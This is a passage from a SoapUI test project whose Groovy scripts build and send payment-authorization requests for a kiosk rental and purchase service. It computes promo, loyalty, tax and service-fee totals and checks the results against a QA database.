		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}
//Build Promo Payload
	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	//TSP
	//else if (hasTSP == 'true')
	else if (numberOfTSPFlags > 0)
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		tspFlagList = tspFlag.split(","); //TSP

		for (tsp = 0; tsp < numberOfTSPFlags; tsp++)
		{
			curPromoTitleID = getNonLoyaltyProductIdList[tsp].toString().trim();
			curPromoTitlePrice = getNonLoyaltyProductPriceList[tsp].toString().trim();
			curTspFlag = tspFlagList[tsp].toString().trim(); //TSP
			promoPayload += "{";
			promoPayload += "\"ProductId\": $curPromoTitleID,";
			promoPayload += "\"DiscountType\": \"PromotionCode\",";
			promoPayload += "\"PromotionCode\": \"$PromoCode\",";			
            	promoPayload += "\"PromotionIntentCode\": 4,";
			promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
			promoPayload += "\"Amount\": $discountvalue";
			promoPayload += "}";	

			tspPromoAmount += (discountvalue.toBigDecimal());
			discountedProductId.add(curPromoTitleID);
			discountedProductPrice.add(discountvalue);
			if (tsp+1 < numberOfTSPFlags)
			  {
					if (curTspFlag == '1')
					{
						promoPayload += ","
					}
					else
					{
						//None as of Now						
					}
			  }
		}
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		
		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		//Set Remaining Promo value same as Promo Value
		testRunner.testCase.setPropertyValue("RemainingPromoValue",promoCodeValue.toString());

		//For Loop to build Promo Payload
		for (d = 0; d < getNonLoyaltyProductIdList.size(); d++)
		{
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			if (remainingPromoValue > 0)
			{
				curPromoTitleID = getNonLoyaltyProductIdList[d].toString().trim();
				curPromoTitlePrice = getNonLoyaltyProductPriceList[d].toString().trim();
				BigDecimal curPromoAmount = 0; //For assertions.
				promoPayload += "{";
				promoPayload += "\"ProductId\": $curPromoTitleID,";
				promoPayload += "\"DiscountType\": \"PromotionCode\",";
				promoPayload += "\"PromotionCode\": \"$PromoCode\",";
				promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
				promoPayload += "\"PromotionIntentCode\": 7,";
		
				BigDecimal currentPromoValue = remainingPromoValue - (curPromoTitlePrice.toBigDecimal());
		
				if (remainingPromoValue >= curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $curPromoTitlePrice";
					appliedPromoValue += (curPromoTitlePrice.toBigDecimal());
					curPromoAmount = curPromoTitlePrice.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					remaingPromoValue = (remainingPromoValue.toBigDecimal() -  curPromoTitlePrice.toBigDecimal());
					//Set Remaining Promo value after above calculation
					testRunner.testCase.setPropertyValue("RemainingPromoValue",remaingPromoValue.toString());
		
				}
				else if (remainingPromoValue < curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $remainingPromoValue";
					appliedPromoValue += (remainingPromoValue.toBigDecimal())
					curPromoAmount = remainingPromoValue.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					//Set Remaining Promo value as 0.00
					testRunner.testCase.setPropertyValue("RemainingPromoValue","0.00");
				}
				else
				{
					log.info ("No PromoValue Remaining");
				}
				
				promoPayload += "}";				
			    	//For Assertions grabbing all the Discounted Titles and Prices.
			    	discountedProductId.add(curPromoTitleID);
			    	discountedProductPrice.add(curPromoAmount);	
			}
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			//Continue to for loop if number of titles available and have Remaining promo value > 0
			if ((d+1 < getNonLoyaltyProductIdList.size()) && remainingPromoValue > 0)
			        {
			            promoPayload += ",";
			        } 
		}
		//log.info ("PromoPayload: $promoPayload");
	}
	testRunner.testCase.setPropertyValue("AppliedPromoValue",appliedPromoValue.toString());
	testRunner.testCase.setPropertyValue("DiscountAmountList",discountAmountList.join(",").toString()); //PROMO
	log.info ("promoPayload:$promoPayload");
	testRunner.testCase.setPropertyValue("EstimatedLoyaltyAmount", EstimatedLoyaltyAmount.toString());
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	log.info ("EstimatedLoyaltyAmount:$EstimatedLoyaltyAmount; discountvalue:$discountvalue");
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal());
	//log.info ("discountedSubTotal:$discountedSubTotal");
	//if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//TSP
	if (numberOfTSPFlags > 0) 
	{
		discountvalue = tspPromoAmount; //Promo Amount is set as TSP Amount.
		testRunner.testCase.setPropertyValue("PromoValue", tspPromoAmount.toString())
	}
	if (discountedSubTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	//rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	TotalCartAmount += discountedSubTotal; //To get total amount
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	//grandTotal = Round16.format(grandTotal).toBigDecimal();
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}
log.info ("discountedProductId:$discountedProductId; discountedProductPrice:$discountedProductPrice");
//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    curmdvFlag = mdvFlagList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);
	    getDisctc.setPropertyValue('IsMDV',curmdvFlag);  //MDV  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	
	//Offer Code	
	offerCodeList = remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		curOfferCode = offerCodeList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		purchasePayload += "\"Barcode\" : \"$curBarcodeID\","
		purchasePayload += "\"VendStatus\" : 28," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		//MDV
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"DiscNumber\" : null,"
		if (curOfferCode == '1')
		{
			purchasePayload += "\"OfferCode\" : \"RC\","
		}
		else
		{
			purchasePayload += "\"OfferCode\" : null,"
		}
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		allBarcodes.add(curBarcodeID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
		testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString());
		//MDV
		purchaseMDVFlag.add('false');
		purchaseMDVDiscNumber.add('null');
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	    //MDV
	    testRunner.testCase.setPropertyValue('PurchaseMDVFlag', purchaseMDVFlag.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseMDVDiscNumber', purchaseMDVDiscNumber.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	TotalCartAmount += totalPurchaseTotal; //To get total amount
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
testRunner.testCase.setPropertyValue('AllBarcodes', allBarcodes.join(",").toString());
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty Only");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("Has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("Has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload");
testRunner.testCase.setPropertyValue("DiscountPayload", discountPayload);
if (enableServiceFee == 'true')
{		
	serviceFeePayload += ",\"ServiceFee\": {";
	serviceFeePayload += "\"DefaultAmount\": \"$serviceFeeAmount\",";
	serviceFeePayload += "\"TaxRate\": $serviceFeeTaxRate,";
	if (TotalCartAmount > 0)
	{
		serviceFeePayload += "\"ActualAmount\": \"$serviceFeeAmount\",";
		BigDecimal serviceFeeTaxAmt = ((serviceFeeAmount).toBigDecimal()) * ((serviceFeeTaxRate).toBigDecimal()/100);
		serviceFeeTaxAmt = Round16.format(serviceFeeTaxAmt).toBigDecimal();
		serviceFeePayload += "\"TaxAmount\": \"$serviceFeeTaxAmt\" }";
	}
	else
	{
		serviceFeePayload += "\"ActualAmount\": \"0.00\",";
		serviceFeePayload += "\"TaxAmount\": \"0.00\" }";
	}
}
else
{
	log.info ("NO ServiceFee enabled");
}
testRunner.testCase.setPropertyValue("ServiceFeePayload",serviceFeePayload);

//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Authorize Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"GCAuthorize\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
if ((CustomerProfileNumber == "") || (CustomerProfileNumber == "<CPCUSTOMERNUMBER/>"))
{
	//No CP for the credit card
	requestPayload += "\"CustomerProfileNumber\": null,";
	requestPayload += "\"PropertyBag\": { },";
}
else
{
	requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
	requestPayload += "\"PropertyBag\": { \"EarlyIdIndicator\":\"true\" },"
}
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"UseCredits\": \"OptedOut\",";
//requestPayload += "\"UseCredits\": \"OptedIn\",";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("Authorize Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
def IsOffline = context.expand( '${#TestCase#IsOffline}');
if (IsOffline == 'true')
{
	log.info ("No Authorize, skip to Reconcile");
	testRunner.gotoStepByName("Auth Completed");
}
else
{
	//Run Auth
}]]></script></con:config></con:testStep><con:testStep type="httprequest" name="GCAuthorize (Request)" id="4e3a329d-cbdf-4513-bcb2-621f58d6cdad"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="GCAuthorize (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("Authorize Response: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save Authorize Response" id="e0b8f0ac-570c-4d29-afac-da37ae08f696"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('GCAuthorize (Request)').getPropertyValue('Response');
//log.info(encodedBody);
def decodedBody = URLDecoder.decode(encodedBody);
//log.info("AuthResponse:$decodedBody");
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumber');
log.info('Transaction_ID = ' + list.get('ReferenceNumber'))
testRunner.testCase.setPropertyValue("TransactionID",list.get('ReferenceNumber').toString());

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def getInvoiceDetails = sql.firstRow("Select max(OID) AS ID from Invoice Where ReferenceNumber = '$TransactionID'");
def InvoiceId = getInvoiceDetails.ID;
testRunner.testCase.setPropertyValue("InvoiceID",InvoiceId.toString());</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="fb9f3ff4-d15d-4431-96fc-4a252a3eafc8"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_id,
	kioskclient_id,
	promotioncode,
	promotionvalue,
	transaction_status,
	rent_date,
	approvalcode,
	invoiceid,
	amount,
	isoffline,
	rentaltype,
	authamount,
	subtotal,
	discountedsubtotal,
	salestaxamount,
	grandtotal,
	billingtypeid,
	rentaltaxrate,
	purchasetaxrate,
	rentaltaxamount,
	purchasetaxamount,
	shoppingcarttype,
	optintypeID,
	cpCustomerNumber
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:storedProcedure>false</con:storedProcedure><con:assertion type="Simple Contains" name="Contains ApprovalCode" id="b6c88e9c-d6aa-482f-a3cf-28de7d50e88c"><con:configuration><token>Approved</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check BillingType" id="3d102727-0107-496f-9f31-2aec87ad4ec2" disabled="true"><con:configuration><scriptText>//import groovy.json.JsonSlurper

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def CCType = context.expand( '${#TestCase#CCType}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Added if and else logic for PRM and PRG functionality and GiftCard
if ((numrentals > 0 &amp;&amp; numpurchases > 0) || CCType == 6)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}

/* DISABLED THE ASSERTION BASED ON COLLECTION METHOD
else
{
	// if collection method is 1 or 2, billing type 6, collection method 4 or 6 = billing type 7
	if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 1)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 2)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 4)
		assert actualValue == 7
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 6)
		assert actualValue == 7
	else
		assert 0 == 1
}
 */</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check Amounts" id="62dae791-ac46-4245-b0bd-42288e2bb164" disabled="true"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");

//Get Rental Count
def numRentals = context.expand( '${#TestCase#RentalCount}' ).toBigDecimal();
def numPurchases = context.expand( '${#TestCase#PurchaseCount}' ).toBigDecimal();
def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}' );

//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualRentalTaxAmount = holder.getNodeValue("//RENTALTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxAmount = holder.getNodeValue("//PURCHASETAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualRentalTaxRate = holder.getNodeValue("//RENTALTAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxRate = holder.getNodeValue("//PURCHASETAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualGrandTotal = holder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualDiscountedSubTotal = holder.getNodeValue("//DISCOUNTEDSUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSubTotal = holder.getNodeValue("//SUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualAuthAmount = holder.getNodeValue("//AUTHAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPromotionValue = holder.getNodeValue("//PROMOTIONVALUE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
